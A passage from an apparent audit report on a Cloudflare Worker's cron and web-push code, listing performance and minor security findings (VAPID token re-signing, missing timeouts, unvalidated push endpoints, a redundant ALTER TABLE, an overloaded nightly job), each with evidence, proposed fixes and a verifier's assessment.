because the test's fake VAPID key fails before fetch.

<a id="worker-cron-notify-12"></a>
#### worker-cron-notify-12 — sendWebPush rebuilds and re-signs the VAPID JWT for every subscription and has no timeout; fan-outs are serial N+1 queries

*low · minor · performance · confidence high · `worker.js:9641` · ✅ confirmed*

**Evidence.** sendWebPush calls `buildVapidJwt(env, origin)` on every send (9641). That is an ECDSA `importKey('jwk', ...)` plus `sign` each time (9556-9566), although the token is valid for 12 h (`exp: now + 43200`) and there are only ~3 push-service origins. The `fetch(subscription.endpoint, ...)` at 9654 has no AbortSignal. Every dispatcher loops users serially and issues `SELECT endpoint, p256dh, auth FROM push_subscriptions WHERE user_id = ?` per user (7082, 7258, 7306, 8188, 6993, 15343).

**Failure scenario.** The hourly fan-out does 2 extra WebCrypto operations and 1 extra D1 round trip per recipient. One hung push-service connection (no timeout) stalls every later recipient in that run, and in the every-minute invocation it holds the isolate alongside the sale scheduler.

**Proposed fix.** Keep a module-level `const _vapidCache = new Map()` keyed by origin, holding `{ jwt, until }`. Reuse the JWT while `until > now + 3600`, and import the signing key once per isolate. Add `signal: AbortSignal.timeout(10000)` to the push fetch; a timeout already lands in the existing per-sub catch. Optionally load all subscriptions for the recipient set in one `SELECT user_id, endpoint, p256dh, auth FROM push_subscriptions` and group them in JS. That also avoids D1's 100-parameter cap.

**Verifier (confirmed).** sendWebPush calls buildVapidJwt on every send (9641): an importKey plus sign each time, for a 12 h token (9549). The push fetch at 9654 has no signal. Every dispatcher queries push_subscriptions once per user in series. At this scale, roughly a few dozen subscriptions per fan-out, the crypto and D1 cost is milliseconds and does not matter. The one real risk is the missing timeout: a hung push-service connection stalls every later recipient in that fan-out. *Fix notes:* `signal: AbortSignal.timeout(10000)` is the valuable part, and a timeout already lands in each caller's per-subscription catch. A per-origin JWT cache in a module-level Map is safe, because a secret change redeploys and so starts fresh isolates. Batching the subscription SELECT is optional; the gain at this scale is negligible.

<a id="worker-cron-notify-13"></a>
#### worker-cron-notify-13 — Push endpoints are not validated: the worker POSTs to any stored URL on every cron, and permanently broken subscriptions are never removed

*low · minor · security · confidence high · `worker.js:9654` · ✅ confirmed*

**Evidence.** push-subscribe (21321-21324) checks only that `endpoint`, `p256dh` and `auth` are present. Any string is stored, and `ON CONFLICT(endpoint) DO UPDATE SET user_id = excluded.user_id` (21340-21341) lets a caller move an existing endpoint to their own account. sendWebPush then runs `fetch(subscription.endpoint, { method:'POST', headers:{ Authorization: authHeader, ...` (9654). Only 404/410 are treated as dead (9660). A malformed URL throws at `new URL(...)` (9640), and a 400/403 (e.g. the subscription was made under a different VAPID key) throws; both are counted as 'failed' forever and retried on every cron.

**Failure scenario.** Any signed-in user, including staff, registers endpoints such as https://victim.example/hook. Every daily, weekly and hourly fan-out they are opted into makes the Worker POST a signed VAPID token and ciphertext there. After a VAPID key rotation, every old subscription 403s on every cron indefinitely and inflates `push.failed`.

**Proposed fix.** In push-subscribe, reject any endpoint that is not `https:` on a known push service: fcm.googleapis.com, updates.push.services.mozilla.com, *.push.apple.com / web.push.apple.com, *.notify.windows.com. Return 400. In sendWebPush, treat 400/403 with a VAPID or credential mismatch message the same as 404/410 (`expired: true`) so the existing loops delete the row. An invalid URL should also return `{ expired:true }` instead of throwing.

**Verifier (confirmed).** push-subscribe (21317-21345) checks only that the fields are present and stores any endpoint string. sendWebPush POSTs to it (9654), and only 404/410 mark a subscription expired (9660). Real impact is small. Each user is capped at 5 devices (21325). The payload is encrypted to the attacker's own p256dh, so they only receive what they are already entitled to. The VAPID JWT is aud-bound to their origin, so it cannot be replayed. Hijacking another user's endpoint via ON CONFLICT(endpoint) needs that user's unguessable endpoint URL. What remains is the Worker POSTing to an arbitrary public URL a few times a day, plus a permanently failing subscription being retried on every fan-out. *Fix notes:* The push-service allowlist at subscribe time is fine: https only; fcm.googleapis.com, *.push.services.mozilla.com, web.push.apple.com / *.push.apple.com, *.notify.windows.com; 400 on anything else or an unparseable URL. Deleting on 400/403 in sendWebPush is dangerous. If OUR VAPID keys are wrong, for example the bad-deploy case in finding 9, every push service answers 401/403. The existing loops would then delete every user's subscription in one fan-out, and the frontend never re-subscribes on its own (index.html:12163-12168; no pushsubscriptionchange in sw.js). Never delete on 400. Delete on 403 only for the FCM 'credentials used to create the subscription' mismatch, and only when other subscriptions in the same run succeeded. Otherwise log and count it.

<a id="worker-cron-notify-14"></a>
#### worker-cron-notify-14 — saveSnapshot runs a failing ALTER TABLE on every call: 24 times a night and on every dashboard load

*low · minor · performance · confidence high · `worker.js:4640` · ✅ confirmed*

**Evidence.** worker.js:4640 runs `try { await env.DB.prepare('ALTER TABLE daily_sales ADD COLUMN avg_asp REAL').run(); } catch {}` before every upsert. migration-013.sql:11 already adds the column. saveSnapshot is reached from the nightly pass (6 stores), the clientCreatedTime sweep (18 store-days) and the live route (`ctx.waitUntil(saveSnapshot(...))`, 28202), which runs on every dashboard ?store= request.

**Failure scenario.** Every one of those calls spends an extra D1 round trip on a DDL statement that always fails, adding to the nightly subrequest and D1-query budget that comment 15626-15628 treats as tight, and running a schema-changing statement on the hot path.

**Proposed fix.** Keep the self-heal but run it once per isolate: `let _avgAspChecked = false;` at module level, then `if (!_avgAspChecked) { try { await env.DB.prepare('ALTER TABLE ...').run(); } catch {} _avgAspChecked = true; }`. That removes the per-call cost with no risk to an environment that somehow lacks the column.

**Verifier (confirmed).** worker.js:4640 runs `ALTER TABLE daily_sales ADD COLUMN avg_asp REAL` before every upsert, and migration-013.sql:11 already added the column, so it always fails. saveSnapshot is reached from the live ?store= route (28202), from fetchAggregateAndSnapshot (4780) in the nightly pass and sweep, and from the admin re-snapshot. That costs one wasted D1 round trip per call. The cost is real but small. *Fix notes:* A once-per-isolate flag is correct. Deleting the line outright is simpler, since migration-013 is applied. Either way it is worker-only and writes nothing different.

<a id="worker-cron-notify-15"></a>
#### worker-cron-notify-15 — Nightly job does all its work in one serial invocation: today is fetched twice, closed Holland is fully processed, and the subrequest budget comment is out of date

*low · major · performance · confidence medium · `worker.js:28278` · ✅ confirmed*

**Evidence.** The '55 3' branch runs, one after another in a single invocation: a per-store pass for today (28278-28342: orders, refunds, manual refunds, category map, cross-day orders, aggregateItemSales, snapshot, item snapshot); then the sweep over today + 2 prior days × 6 stores (28354-28364), whose k=0 pass re-fetches and overwrites the same today snapshot with a wider window; then 6 bank days (28392-28398), rollups, and the sheet import (~258 subrequests by its own comment, 15626-15628). ALL_STORES still includes BL8, closed since 2026-07-25 (STORE_CLOSED_FROM), so Holland gets 1 pass + 3 sweep days + 1 bank day every night, all returning zero orders. The '~180' snapshot figure in the budget comment predates the sweep and the bank step.

**Failure scenario.** If Clover is slow or 429s during the sweep, the one invocation runs into its wall-clock or subrequest ceiling. The stages that run last, the sheet import and then the failure alert, are the ones that get skipped, and none of that is visible (see finding 7).

**Plan.** Future plan, worker-only. (1) Add crons '10 4 * * *' (bank + rollups) and '25 4 * * *' (sheet import), each wrapped in superviseCronJob and gated on the heartbeat from finding 7 (`cron:nightly:ok === todayStr`). That preserves the load-bearing order 'sheet import after the snapshot' (28419-28423) even if the first run is late. (2) Skip stores where `STORE_CLOSED_FROM[s] <= d` in the pass, sweep and bank. That only removes pulls; it never re-pulls anything. (3) Consider dropping the createdTime pass for today once the k=0 sweep has proven equivalent over a week of side-by-side D1 comparisons. It writes daily_sales, so do it only after that cross-check (CLAUDE.md rule 4). Deploy: worker only, then read back the crons printed by `wrangler deploy` (lessons 2026-07-15). Verify: next morning's daily_sales rows for all open stores carry snapshot_time between 03:55 and 04:10 UTC, and txn-archive and sheet-import log lines appear under their new crons.

**Verifier (confirmed).** The facts check out. The first pass fetches today by createdTime (28278-28342), then the k=0 sweep re-fetches today with a wider window and overwrites it (28354-28364); the comment at 28345-28350 shows this is deliberate. BL8 (closed since 2026-07-25) gets 1 pass, 3 sweep days and 1 bank day every night; its zero-order days are not written (4755-4760). The budget comment at 15626-15628 does not count the sweep or the bank step. The failure scenario, running into the subrequest ceiling, is not substantiated. By my count: about 15 subrequests per sweep store-day × 18 ≈ 270, a first pass of about 90, bank about 30, sheet import about 258. That totals roughly 650-700, under the 1,000 the comment assumes. The main value is keeping the comment accurate and skipping closed stores. *Fix notes:* The proposed new crons '10 4 * * *' and '25 4 * * *' cross ET midnight while EDT is in force. The 03:55 UTC run happens at 23:55 EDT on day D. 04:10 UTC is 00:10 EDT on D+1, so getETToday() in the split stages returns the next date. The bank date (todayStr-3), the sheet-import window and the `cron:nightly:ok === todayStr` gate would all shift by a day for about 8 months of the year. The split stages must take their date from the heartbeat value written by the 03:55 run, not recompute it. Skipping `STORE_CLOSED_FROM[s] <= d` stores only removes pulls and is safe. Also consider whether BL8 days must still be banked for archive-completeness reporting. Any new cron needs wrangler.toml changes in both [triggers] and [env.staging.triggers], and the crons printed by `wrangler deploy` must be read back (lessons 2026-07-15).

</details>
